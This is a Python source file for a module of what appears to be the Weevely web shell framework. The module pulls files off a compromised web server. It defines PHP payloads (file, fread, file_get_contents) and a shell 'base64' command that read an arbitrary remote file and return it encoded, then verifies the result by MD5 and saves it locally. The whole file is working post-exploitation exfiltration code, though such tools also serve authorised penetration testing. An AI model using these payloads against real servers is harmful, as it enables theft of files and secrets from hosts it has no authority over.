from core.vectors import PhpCmd, ShellCmd, ModuleCmd, Os
from core.module import Module
from core import messages
from core.loggers import log
import random
import hashlib
import base64


class Download(Module):

    """Download file to remote filesystem."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            PhpCmd(
              "print(@base64_encode(implode('',@file('${rpath}'))));",
              name = 'file'
              ),
            PhpCmd(
              "$f='${rpath}';print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
              name = 'fread'
              ),
            PhpCmd(
              "print(@base64_encode(file_get_contents('${rpath}')));",
              name = 'file_get_contents'
              ),
            ShellCmd(
              "base64 -w 0 ${rpath}",
              name = 'base64',
              target = Os.NIX
              ),
            ]
        )

        self.register_arguments({
          'rpath' : { 'help' : 'Remote file path' },
          'lpath' : { 'help' : 'Local file path' },
          '-vector' : { 'choices' : self.vectors.get_names(), 'default' : 'file' }
        })

    def run(self, args):

        expected_md5 = ModuleCmd('file_check', [ args.get('rpath'), 'md5' ]).run()

        def md5check(result):
            if expected_md5:
                return hashlib.md5(base64.b64decode(result)).hexdigest() == expected_md5
            else:
                return bool(result)

        vector_name, result = self.vectors.find_first_result(
         format_args = args,
         condition = md5check
        )

        if not result:
            log.warn(messages.module_file_download.failed_download_file)
            return

        # Dump to local file
        lpath = args.get('lpath')

        try:
            open(lpath, 'wb').write(base64.b64decode(result))
        except Exception, e:
            log.warning(
              messages.generic.error_loading_file_s_s % (lpath, str(e)))
            return
